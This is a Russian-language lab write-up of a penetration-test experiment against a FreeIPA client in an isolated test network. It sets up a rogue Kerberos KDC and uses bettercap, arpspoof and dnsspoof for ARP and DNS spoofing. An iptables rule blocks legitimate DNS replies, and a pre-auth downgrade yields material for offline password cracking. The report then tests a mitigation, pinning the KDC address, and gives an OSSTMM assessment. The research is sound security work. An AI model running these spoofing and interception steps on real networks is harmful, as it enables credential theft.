# Эксперимент 2. Rogue KDC + DNS/ARP-спуфинг

**Цель:** проверить, доверяет ли клиент FreeIPA подменённому KDC и можно ли перехватить канал управления Kerberos (MITM), вынудив клиента обращаться к фальшивому серверу.

**MITRE ATT&CK:** T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning), T1565.002 (Data Manipulation: Transmitted Data Manipulation)

> Техника T1584.002 (Compromise Infrastructure: DNS Server) для локального спуфинга **не подходит** — она описывает компрометацию внешней DNS-инфраструктуры, а не подмену ответов в локальном сегменте.

**Хосты:** `ipa.test.ru` (10.7.7.1), `client.test.ru` (10.7.7.20), `attacker` (10.7.7.66)

---

## Идея атаки

Перенаправить запрос клиента на получение TGT на атакующую машину: ARP-спуфинг ставит attacker в разрыв трафика клиент↔сервер, DNS-спуфинг подменяет резолв `ipa.test.ru` на 10.7.7.66, а поднятый на attacker фальшивый KDC принимает pre-auth данные клиента.

## 2.1. Подготовка фальшивого KDC

`/etc/krb5.conf` на attacker:

```ini
[libdefaults]
    default_realm = TEST.RU
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
TEST.RU = {
    kdc = 10.7.7.66:88
    admin_server = 10.7.7.66
}

[domain_realm]
    .test.ru = TEST.RU
    test.ru = TEST.RU
```

Создаём базу KDC и включаем форвардинг пакетов:

```bash
kdb5_util create -r TEST.RU -s
sysctl -w net.ipv4.ip_forward=1
```

## 2.2. Спуфинг (bettercap)

```bash
bettercap
```

В консоли bettercap:

```
set arp.spoof.targets 10.7.7.20,10.7.7.1
arp.spoof on
net.probe on
set dns.spoof.domains ipa.test.ru
set dns.spoof.address 10.7.7.66
dns.spoof on
```

- ARP-спуфинг перенаправляет трафик между жертвой (10.7.7.20) и сервером (10.7.7.1) через attacker.
- DNS-спуфинг подменяет ответы на запросы `ipa.test.ru`, указывая 10.7.7.66.

---

## 2.3. Препятствие 1: кэширование адреса KDC в SSSD

При первой попытке на клиенте:

```bash
# на attacker
tcpdump -i eth0 port 88
# на client
kinit testuser
```

В трафике видно, что клиент обращается к **10.7.7.1**, а не к спуферу.

**Причина:** служба SSSD фиксирует IP-адрес KDC. Адрес хранится в памяти и в файле:

```
/var/lib/sss/pubconf/krb5.info.d/kdcinfo.test.ru
```

Пока адрес закэширован, DNS-подмена не влияет на последующие вызовы `kinit`. Атака возможна только в момент, когда SSSD заново резолвит сервер.

**Триггер повторного резолва** — перезапуск SSSD на клиенте:

```bash
systemctl restart sssd
```

После рестарта клиент снова делает DNS-запрос `_ldap._tcp.test.ru`, и вот этот запрос можно перехватить.

## 2.4. Препятствие 2: гонка с легитимным DNS

При спуфинге обнаруживается, что **легитимный DNS-сервер отвечает быстрее** фальшивого:

- легитимный ответ — ~2 мс
- спуфер (dnsspoof) — ~270 мс

Клиент принимает первый пришедший ответ — то есть настоящий. Чтобы спуфер выиграл гонку, нужно **заблокировать легитимные ответы** до того, как клиент их получит. На attacker (находящемся в разрыве трафика) добавляем DROP на форвардинг DNS-ответов от настоящего сервера:

```bash
iptables -A FORWARD -s 10.7.7.1 -p udp --sport 53 -j DROP
```

Теперь легитимный DNS-ответ не доходит до клиента, и единственным ответом остаётся спуфленный (10.7.7.66).

## 2.5. Финальный рабочий сценарий

Итоговая последовательность, при которой атака воспроизводится:

```bash
# --- attacker ---
sysctl -w net.ipv4.ip_forward=1
iptables -A FORWARD -s 10.7.7.1 -p udp --sport 53 -j DROP   # блокируем легитимный DNS

# ARP + DNS спуфинг (bettercap, см. 2.2), либо dsniff:
arpspoof -i eth0 -t 10.7.7.20 10.7.7.1 &
arpspoof -i eth0 -t 10.7.7.1 10.7.7.20 &
dnsspoof -i eth0 -f hosts.txt &   # hosts.txt: 10.7.7.66  ipa.test.ru

tcpdump -i eth0 port 88           # наблюдаем за обращением к KDC

# --- client ---
systemctl restart sssd            # сбрасываем кэш адреса KDC
kinit testuser
```

После рестарта SSSD и блокировки легитимного DNS клиент резолвит `ipa.test.ru` в 10.7.7.66 и направляет AS-REQ на фальшивый KDC.

## 2.6. Что именно перехватывается: downgrade pre-auth

Сравнение поведения KDC через `KRB5_TRACE`:

- **Легитимный KDC** анонсирует 7 типов pre-auth, включая PA-SPAKE, PA-FX-FAST, PA-PK-AS-REQ (PKINIT).
- **Фальшивый KDC** анонсирует только PA-ETYPE-INFO2.

В результате клиент **молча откатывается** на PA-ENC-TIMESTAMP и отправляет временную метку, зашифрованную производным от пароля. Детектирования отката **на стороне клиента не происходит** — это и есть перехваченный материал для офлайн-перебора.

## Защита: чем нейтрализуется

Жёсткая привязка KDC в `/etc/krb5.conf` клиента (проверено экспериментально):

```ini
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
TEST.RU = {
    kdc = 10.7.7.1:88
}
```

При явно прописанном IP KDC ARP-спуфинг перестаёт давать доступ к pre-auth: L2-перенаправление меняет MAC-получателя, но **не IP-назначение** — пакеты по-прежнему адресованы 10.7.7.1. Атакующий ограничен ролью прозрачного прокси и не может выдать себя за KDC.

> ⚠️ **Важно для корректности выводов.** Параметра `fast_required = true` в стандартном MIT Kerberos `[libdefaults]` **не существует**. Параметр `krb5_use_fast` есть только в `sssd.conf` (для PAM), но не для прямого `kinit`. Поэтому анонимный PKINIT и хардеринг на базе FAST в работе подаются как **директивные (теоретические) рекомендации**, а не как экспериментально подтверждённые меры.

## Оценка по OSSTMM

| Метрика | Оценка | Обоснование |
|---------|--------|-------------|
| **Visibility** | Средняя | ARP/DNS-спуфинг и DROP легитимного трафика заметны в сетевом мониторинге; рестарт SSSD — наблюдаемое событие. |
| **Access** | Высокий барьер | Нужен доступ к L2-сегменту и условие повторного резолва (рестарт SSSD); кэш KDC в SSSD защищает в установившемся режиме. |
| **Trust** | Средний | Клиент доверяет DNS-резолву при первичной инициализации; downgrade pre-auth не детектируется клиентом. |

## Вывод

В установившемся режиме SSSD-кэш делает атаку нерезультативной. Она воспроизводится только в окне повторного резолва (рестарт SSSD) и при выигранной гонке с легитимным DNS (iptables DROP). Явная привязка `kdc = 10.7.7.1:88` с отключённым DNS-resolve защищает инфраструктуру от Rogue KDC на уровне сетевой адресации.
